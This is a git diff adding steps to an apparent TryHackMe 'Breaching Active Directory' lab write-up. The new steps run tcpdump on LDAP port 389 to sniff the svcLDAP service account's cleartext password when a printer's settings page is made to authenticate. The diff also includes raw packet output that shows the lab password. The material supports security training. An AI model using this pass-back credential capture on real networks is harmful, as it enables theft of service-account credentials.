@@ -505,6 +505,33 @@ result: 0 Success
                                                                                               
 $ 
 ```
+The run the following line as is and retry the url http://printer.za.tryhackme.com/settings.aspx:
+```
+sudo tcpdump -SX -i breachad tcp port 389
+```
+The password is obtained for svcLDAP account (may have to send twice from the URL for it to be captured):
+```
+┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/Learning_modules/Breaching_Active_Directory]
+└─$ sudo tcpdump -SX -i breachad tcp port 389
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on breachad, link-type RAW (Raw IP), snapshot length 262144 bytes
+05:15:29.576114 IP 10.200.70.201.53173 > 10.150.70.22.ldap: Flags [SEW], seq 43895292, win 64240, options [mss 1287,nop,wscale 8,nop,nop,sackOK], length 0
+....
+05:23:36.473311 IP 10.200.70.201.53362 > 10.150.70.22.ldap: Flags [P.], seq 1048987133:1048987198, ack 2306066694, win 1025, length 65
+        0x0000:  4500 0069 7f18 4000 7f06 da39 0ac8 46c9  E..i..@....9..F.
+        0x0010:  0a96 4616 d072 0185 3e86 45fd 8973 c906  ..F..r..>.E..s..
+        0x0020:  5018 0401 87bb 0000 3084 0000 003b 0201  P.......0....;..
+        0x0030:  0e60 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t
+        0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
+        0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..tryhackmel
+        0x0060:  6461 7070 6173 7331 40                   dappass1@
+...
+
+
+
+```
+
+
 This forces the printer to authenticate using insecure methods.
 
 ### 5. Capturing the Credentials
